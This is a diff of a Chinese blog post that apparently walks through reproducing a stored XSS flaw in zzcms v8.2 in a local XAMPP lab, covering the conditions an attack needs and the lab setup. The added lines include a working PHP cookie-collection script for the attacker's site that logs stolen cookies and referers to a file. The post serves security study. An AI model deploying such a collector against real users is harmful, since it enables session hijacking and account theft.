@@ -121,7 +121,7 @@
     <div class="post-toc" id="post-toc">
     <h2 class="post-toc-title">文章目录</h2>
     <div class="post-toc-content">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#背景"><span class="toc-text">背景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-攻击的原理"><span class="toc-text">XSS 攻击的原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-攻击的分类"><span class="toc-text">XSS 攻击的分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-攻击危害"><span class="toc-text">XSS 攻击危害</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-攻击实现"><span class="toc-text">XSS 攻击实现</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#背景"><span class="toc-text">背景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-攻击的原理"><span class="toc-text">XSS 攻击的原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-攻击的分类"><span class="toc-text">XSS 攻击的分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-攻击危害"><span class="toc-text">XSS 攻击危害</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-攻击实现"><span class="toc-text">XSS 攻击实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#搭建zzcms-v8-2服务运行环境"><span class="toc-text">搭建zzcms v8.2服务运行环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#部署攻击者准备的收集敏感信息的站点"><span class="toc-text">部署攻击者准备的收集敏感信息的站点</span></a></li></ol></li></ol>
     </div>
   </div><div class="post-content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在<a href="https://www.cnvd.org.cn/flaw/typelist?typeId=29" target="_blank" rel="noopener"><code>CNVD</code>（国家信息安全漏洞共享平台）</a>找了一个存在<code>XSS</code>漏洞的<code>Web</code>应用进行复现。在<code>PHP</code> + <code>MySQL</code>环境上搭建出一个真实的实验环境对<code>zzcms v8.2</code>的一个<code>XSS</code>漏洞进行复现，进而解析<code>XSS</code>跨域攻击机制及防御技术。</p>
 <a id="more"></a>
@@ -144,6 +144,20 @@
 <li>…</li>
 </ul>
 <h2 id="XSS-攻击实现"><a href="#XSS-攻击实现" class="headerlink" title="XSS 攻击实现"></a>XSS 攻击实现</h2><p><code>XSS</code>攻击是需要满足<code>XSS</code>攻击的条件。<code>XSS</code>漏洞的利用过程较为直接。反射型/<code>DOM</code>型跨站攻击均可以理解为：服务器接收到数据，并原样返回给用户，整个过程中<code>Web</code>应用并没有存入数据库，这也导致了攻击无法持久化，仅针对当次请求有效，也就无法直接攻击其他用户。一般这两类攻击也可利用钓鱼、垃圾邮件等手段产生攻击其他用户效果。</p>
+<p>反射型与存储型<code>XSS</code>攻击的实现原理和主要流程非常相似，但由于存储型<code>XSS</code>攻击的持久性及危害更加强大，所以本次<code>XSS</code>攻击实现，将采用存储型跨站攻击方式进行实践分析。</p>
+<p>首先，要成功实施跨站脚本攻击，我们需要了解一下存储型跨站的主要业务流程</p>
+<p><img src="/posts/xss-attack-and-defense/business-process.png" alt="business-process"></p>
+<p>根据上图业务流程，存储型<code>XSS</code>攻击有两个重点的步骤：信息入库处理、出库处理，结合<code>XSS</code>攻击的特性可知，<code>XSS</code>攻击成功必须要满足以下四个条件：</p>
+<ol>
+<li>目标网页有攻击者可控的输入点</li>
+<li>输入信息可以在受害者的浏览器中显示</li>
+<li>输入具备功能的可执行脚本，且在信息输入和输出的过程中没有特殊字符的过滤和字符转义等防护措施，或者说防护措施可以通过一定的手段绕过</li>
+<li>浏览器将输入解析为脚本，并具备执行该脚本的能力</li>
+</ol>
+<p>以上四点缺一不可。如果需要做针对<code>XSS</code>攻击的防御，只要针对上述任何一点做好防御，攻击就无法正常开展，<code>XSS</code>漏洞也就不存在了，后面将详细解析<code>XSS</code>攻击的防御。</p>
+<h3 id="搭建zzcms-v8-2服务运行环境"><a href="#搭建zzcms-v8-2服务运行环境" class="headerlink" title="搭建zzcms v8.2服务运行环境"></a>搭建zzcms v8.2服务运行环境</h3><p>因为<code>zzcms v8.2</code>是基于<code>php</code> + <code>mysql</code>环境下运行的，这里将采用<code>php</code> +<code>mysql</code> + <code>xampp</code> 将<code>zzcms</code>部署在<code>window</code>系统上，然后通过浏览器地址栏输入主机<code>IP</code>可进入到<code>zzcms</code>的首页，即搭建成功。部署好靶机后，我们任需要一个收集敏感信息的站点，一个攻击者站点，同时还需要一个用户主机的站点，准备好这些站点，将可以进行漏洞复现。</p>
+<h3 id="部署攻击者准备的收集敏感信息的站点"><a href="#部署攻击者准备的收集敏感信息的站点" class="headerlink" title="部署攻击者准备的收集敏感信息的站点"></a>部署攻击者准备的收集敏感信息的站点</h3><p>同样，我们任需通过<code>xampp</code>来部署收集敏感信息的站点，在<code>..\xampp\htdocs\</code>路径下新建一个文件夹用于采收用户的敏感信息，这里复现漏洞将采用获取用户的<code>cookie</code>值为例。新建文件夹命名为<code>xss</code>，然后在<code>..\xampp\htdocs\xss</code>路劲下新建<code>index.php</code>用于获取用户的<code>cookie</code>。在该<code>php</code>文件下输入以下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$cookie=$_GET[<span class="string">'cookie'</span>];      <span class="comment">//以GET方式获得cookie变量值 </span></span><br><span class="line">$time=date(<span class="string">'Y-m-d g:i:s'</span>);    <span class="comment">//以“年-月-日 时：分：秒”的格式显示时间 </span></span><br><span class="line">$referer=getenv(<span class="string">'HTTP_REFERER'</span>);       <span class="comment">//获取referer </span></span><br><span class="line">$cookietxt=fopen(<span class="string">'cookie.txt'</span>,<span class="string">'a'</span>);   <span class="comment">//打开cookie.txt，若不存在则创建它 </span></span><br><span class="line">fwrite($cookietxt,<span class="string">"time:"</span>.$time. <span class="string">" cookie:"</span>.$cookie. <span class="string">" referer:"</span>.$referer);    <span class="comment">//写入文件 </span></span><br><span class="line">fclose($cookietxt);     <span class="comment">//关闭文件 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
       </div>
       <div class="post-copyright">
